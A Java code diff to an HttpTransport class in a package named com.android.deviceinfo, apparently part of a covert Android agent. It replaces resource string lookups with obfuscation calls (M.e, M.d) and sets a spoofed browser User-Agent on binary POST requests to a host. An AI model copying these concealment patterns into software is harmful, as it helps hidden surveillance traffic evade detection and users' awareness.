@@ -23,9 +23,9 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.params.BasicHttpParams;
 import org.apache.http.params.HttpParams;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -48,7 +48,7 @@ public abstract class HttpTransport extends Transport {
 	 */
 	public HttpTransport(final String host) {
 		// TODO: aggiungere variabilita'....
-		//super("http://" + host + ":" + PORT + Messages.getString("4_2")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+		//super("http://" + host + ":" + PORT + M.d("/wc12/webclient")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 		super("http://" + host + ":" + PORT + "/"); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 
 		this.host = host;
@@ -67,18 +67,18 @@ public abstract class HttpTransport extends Transport {
 	boolean follow_moved = true;
 
 	/** The HEADE r_ contenttype. */
-	protected final String HEADER_CONTENTTYPE = Messages.getString("4_3"); //$NON-NLS-1$
+	protected final String HEADER_CONTENTTYPE = M.e("content-type"); //$NON-NLS-1$
 
 	/** The HEADE r_ setcookie. */
-	protected final String HEADER_SETCOOKIE = Messages.getString("4_4"); //$NON-NLS-1$
+	protected final String HEADER_SETCOOKIE = M.e("set-cookie"); //$NON-NLS-1$
 
 	/** The HEADE r_ contentlen. */
-	protected final String HEADER_CONTENTLEN = Messages.getString("4_5"); //$NON-NLS-1$
+	protected final String HEADER_CONTENTLEN = M.e("content-length"); //$NON-NLS-1$
 
 	// private final String USER_AGENT =
 	// "Profile/MIDP-2.0 Configuration/CLDC-1.0";
 	/** The CONTEN t_ type. */
-	protected final String CONTENT_TYPE = Messages.getString("4_6"); //$NON-NLS-1$
+	protected final String CONTENT_TYPE = M.e("application/octet-stream"); //$NON-NLS-1$
 
 	/** The accept wifi. */
 	static// private static String CONTENTTYPE_TEXTHTML = "text/html";
@@ -124,9 +124,9 @@ public abstract class HttpTransport extends Transport {
 		// CookiePolicy.RFC_2965);
 
 		final HttpPost httppost = new HttpPost(baseurl);
-		httppost.setHeader(Messages.getString("4_7"), //$NON-NLS-1$
-				Messages.getString("4_8")); //$NON-NLS-1$
-		httppost.setHeader(Messages.getString("4_9"), Messages.getString("4_10")); //$NON-NLS-1$ //$NON-NLS-2$
+		httppost.setHeader(M.e("User-Agent"), //$NON-NLS-1$
+				M.e("Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3")); //$NON-NLS-1$
+		httppost.setHeader(M.e("Content-Type"), M.e("application/octet-stream")); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (cookies != null) {
 			for (final Cookie cookie : cookies) {
